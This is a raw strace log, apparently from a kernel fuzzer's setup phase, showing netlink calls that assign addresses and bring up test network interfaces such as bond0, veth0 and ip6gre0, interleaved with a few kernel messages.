[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6tnl0&quot;, ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x09\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6tnl0&quot;, ifr_ifindex=9}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gre0&quot;, ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x14\x08\x00\x01\x00\xac\x14\x14\x14&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gre0&quot;, ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x0a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gre0&quot;, ifr_ifindex=10}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gretap0&quot;, ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x15\x08\x00\x01\x00\xac\x14\x14\x15&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gretap0&quot;, ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x0c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;ip6gretap0&quot;, ifr_ifindex=12}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x15\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;erspan0&quot;, ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x05\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x16\x08\x00\x01\x00\xac\x14\x14\x16&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;erspan0&quot;, ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x05\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;erspan0&quot;, ifr_ifindex=5}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x16\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond0&quot;, ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x17\x08\x00\x01\x00\xac\x14\x14\x17&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond0&quot;, ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x0f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond0&quot;, ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x17\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0&quot;, ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x17\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x18\x08\x00\x01\x00\xac\x14\x14\x18&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0&quot;, ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x17\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0&quot;, ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x17\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x18\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1&quot;, ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x18\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x19\x08\x00\x01\x00\xac\x14\x14\x19&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1&quot;, ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x18\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1&quot;, ifr_ifindex=24}) = 0
[pid  5086] close(4)                    = 0
[   76.857818][   T22] bridge0: port 1(bridge_slave_0) entered disabled state
[   76.866716][   T22] bridge0: port 2(bridge_slave_1) entered disabled state
[   76.880360][ T5086] 8021q: adding VLAN 0 to HW filter on device bond0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x19\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team0&quot;, ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x10\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1a\x08\x00\x01\x00\xac\x14\x14\x1a&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team0&quot;, ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x10\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;team0&quot;, ifr_ifindex=16}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1a\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bridge&quot;, ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x1c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1b\x08\x00\x01\x00\xac\x14\x14\x1b&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bridge&quot;, ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
